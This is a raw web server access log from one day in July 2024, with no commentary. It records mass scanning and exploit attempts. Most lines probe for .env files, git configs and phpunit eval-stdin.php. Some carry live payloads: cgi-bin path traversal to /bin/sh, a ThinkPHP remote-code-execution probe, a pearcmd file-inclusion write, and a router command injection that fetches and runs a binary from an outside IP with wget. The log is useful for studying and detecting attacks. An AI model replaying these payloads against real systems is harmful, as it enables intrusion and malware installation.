141.98.83.197 - - [06/Jul/2024:00:05:38 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.36.115.221 - - [06/Jul/2024:00:14:33 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [06/Jul/2024:00:14:33 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.150.26.246 - - [06/Jul/2024:00:16:14 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.150.26.251 - - [06/Jul/2024:00:20:33 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.224.128.43 - - [06/Jul/2024:00:52:48 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.97.73.245 - - [06/Jul/2024:01:08:15 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.3.243.222 - - [06/Jul/2024:01:09:20 +0000] "GET / HTTP/1.0" 404 150 "-" "-"
20.3.243.222 - - [06/Jul/2024:01:12:35 +0000] "GET / HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.3.243.222 - - [06/Jul/2024:01:12:35 +0000] "GET /swagger HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.3.243.222 - - [06/Jul/2024:01:12:35 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.3.243.222 - - [06/Jul/2024:01:12:35 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.3.243.222 - - [06/Jul/2024:01:12:49 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.3.243.222 - - [06/Jul/2024:01:12:55 +0000] "GET /wsman HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
94.156.68.162 - - [06/Jul/2024:01:27:32 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6"
94.156.68.162 - - [06/Jul/2024:01:28:01 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200"
182.90.225.72 - - [06/Jul/2024:01:29:49 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
182.90.225.72 - - [06/Jul/2024:01:29:51 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
182.90.225.72 - - [06/Jul/2024:01:29:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:52 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:52 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:54 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:55 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:56 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:57 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:58 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:29:59 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:00 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:02 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:03 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:04 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:06 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:07 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:08 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:09 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:10 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:11 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:12 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:13 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:14 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:15 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:16 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:17 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:18 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:19 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:20 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:21 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:22 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:24 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:25 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:27 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:28 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:29 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:30 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:31 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:32 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:33 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:34 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
182.90.225.72 - - [06/Jul/2024:01:30:35 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 150 "-" "Custom-AsyncHttpClient"
57.129.23.166 - - [06/Jul/2024:01:45:13 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:01:45:13 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.97.73.245 - - [06/Jul/2024:02:00:42 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.77.126.178 - - [06/Jul/2024:02:08:50 +0000] "GET / HTTP/1.1" 404 122 "-" "python-requests/2.32.2"
167.71.207.184 - - [06/Jul/2024:02:43:02 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
167.71.207.184 - - [06/Jul/2024:02:43:52 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03C\xFDQ\xAC\x8A\x85G\xE3\xEBKd?y\x16!*L\xDA\x95\x0Bp\x9E\xB5\xF4\xD5\x9F\x0EH\x11\xB7\xA8\xBC \xC6\x0B\x0Fc*I\xE5\xA4\x1A\xF5!\xA4\x8A+\x86\x04\xCB\xA4\xE4W\xAAae[M\x9F\xC7\xA4\xA3`kV\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
172.18.0.1 - - [06/Jul/2024:02:50:49 +0000] "GET /accounts/signup/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:02:50:49 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "http://report.buckfiddy/accounts/signup/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:02:51:52 +0000] "GET /accounts/login/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:02:52:55 +0000] "GET /accounts/login/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
172.18.0.1 - - [06/Jul/2024:02:52:55 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "http://report.buckfiddy/accounts/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
92.249.48.202 - - [06/Jul/2024:03:15:41 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [06/Jul/2024:03:43:28 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.73 - - [06/Jul/2024:04:04:49 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1A&\xEFK%\x0CJ\xAD\x07Z\xD7\xD7\x1D\x00\x97\xC0\x05\x0E\x5C\x8DK&\xC7]\xB6\xF5A\xD9SgC\xFF \x5C\x1Dl\xD7v\xB1\xB5@on\x9E\x12\xB4b\xC9\xD9\xFE\xD0\xF4S" 400 154 "-" "-"
205.210.31.73 - - [06/Jul/2024:04:04:49 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xA6\xF2\xFD" 400 154 "-" "-"
57.129.23.166 - - [06/Jul/2024:04:14:19 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:04:14:20 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.190.175 - - [06/Jul/2024:04:14:55 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
84.54.51.37 - - [06/Jul/2024:04:32:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink80%3B+rm+-rf+r%60) HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
45.79.181.94 - - [06/Jul/2024:04:35:24 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x90{9\xD0\x18\xAA\x95\x05\x1A\xF1\x921b\x0EV\xFC\x07Z\xF5\xCC\x8Eg\xA6\x82\x09G\xF3Z\x02y@\xDE\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
185.191.126.213 - - [06/Jul/2024:04:43:05 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.244.36.159 - - [06/Jul/2024:04:43:13 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
185.150.26.246 - - [06/Jul/2024:04:45:52 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
57.129.23.166 - - [06/Jul/2024:04:54:13 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:04:54:14 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
113.106.95.59 - - [06/Jul/2024:04:57:49 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
113.106.95.59 - - [06/Jul/2024:04:58:00 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
205.210.31.2 - - [06/Jul/2024:05:15:19 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.224.128.43 - - [06/Jul/2024:05:20:14 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
213.25.141.87 - - [06/Jul/2024:05:28:09 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.210.31.120 - - [06/Jul/2024:05:53:22 +0000] "GET / HTTP/1.1" 404 122 "-" "\x22Xpanse-bot"
34.72.176.129 - - [06/Jul/2024:05:54:28 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.132 Safari/537.36"
34.122.147.229 - - [06/Jul/2024:05:54:35 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
184.105.247.196 - - [06/Jul/2024:06:15:39 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA5\xDB\xDC]t\xDB(\xD6U\xE9\x83k^\x8C\xD1?`\x94K]\x5C\x16\xCC\x1A\x9F\xDD\xD1^|\xF2\xC4}\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
141.98.83.197 - - [06/Jul/2024:06:18:23 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.243.39.32 - - [06/Jul/2024:06:36:32 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.79.181.94 - - [06/Jul/2024:06:40:24 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\x19\x8F@\xEE}\x18\x84Yn,\xE4\xBE\xB5\x86d@v'\x9C\xE2\x0E\xFFH\x82\xA3\x0F_\xC3\xF0=\x02\x15\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
64.62.156.103 - - [06/Jul/2024:06:47:53 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
64.62.156.103 - - [06/Jul/2024:06:49:21 +0000] "GET /webui/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Goanna/6.6 Firefox/102.0 PaleMoon/33.0.0"
64.62.156.96 - - [06/Jul/2024:06:50:17 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
64.62.156.95 - - [06/Jul/2024:06:50:53 +0000] "GET /geoserver/web/ HTTP/1.1" 404 122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
57.129.23.166 - - [06/Jul/2024:07:01:19 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [06/Jul/2024:07:01:20 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.150.26.251 - - [06/Jul/2024:07:02:43 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
204.13.234.27 - - [06/Jul/2024:07:21:32 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 122 "http://20.120.210.192:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
204.13.234.27 - - [06/Jul/2024:07:21:32 +0000] "" 400 0 "-" "-"
78.153.140.179 - - [06/Jul/2024:07:37:24 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.179 - - [06/Jul/2024:07:37:26 +0000] "\x16\x03\x01\x00\xDE\x01\x00\x00\xDA\x03\x03\xDA\xA2\xDF\xAF\xAD|b\xEA\x0BNW\xA5\xB4\xA9\x01\xE4\xD23o\x13" 400 154 "-" "-"
92.249.48.202 - - [06/Jul/2024:08:14:26 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.223.34.57 - - [06/Jul/2024:08:42:31 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03+\xCCuq\xD3}\xD1*\x99E:\xCC\xE0\xAA\xD1\x8D\xFC\x00\x88K\x9A\xC0\x13%\xC7\xAA\xAC@\xB8:\xAF\xCE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.34.57 - - [06/Jul/2024:08:42:31 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE4?\x970~[|i\xBE\xF7\xDC\x0B\x16Tf\xF3v\xFF\x94\xF1d\xB2\xDF\xEE\xB0{\x1F\x91\xD1\x843\xA0\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.34.57 - - [06/Jul/2024:08:42:31 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:32 +0000] "GET /form.html HTTP/1.1" 404 122 "-" "curl/8.1.2"
159.223.34.57 - - [06/Jul/2024:08:42:32 +0000] "GET /upl.php HTTP/1.1" 404 122 "-" "Mozilla/5.0"
159.223.34.57 - - [06/Jul/2024:08:42:32 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB5h\x82Rw\xF8\x1D\xC1\xCF\xF6\xBBH\xAE\xE7\xD0\xCF0\x9C\xE2g\xCFA-\xFE\x0B\xAAW\xAF\xDE\x82.\xD5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
159.223.34.57 - - [06/Jul/2024:08:42:33 +0000] "GET /geoip/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:33 +0000] "GET /favicon.ico HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:33 +0000] "GET /1.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:33 +0000] "GET /bundle.js HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:34 +0000] "GET /files/ HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:34 +0000] "GET /systembc/password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:35 +0000] "GET /password.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
159.223.34.57 - - [06/Jul/2024:08:42:35 +0000] "GET /info.php HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.148.10.251 - - [06/Jul/2024:08:49:11 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.98.83.197 - - [06/Jul/2024:08:50:43 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
4.255.99.105 - - [06/Jul/2024:09:05:02 +0000] "GET /ReportServer HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
35.203.210.117 - - [06/Jul/2024:09:22:45 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
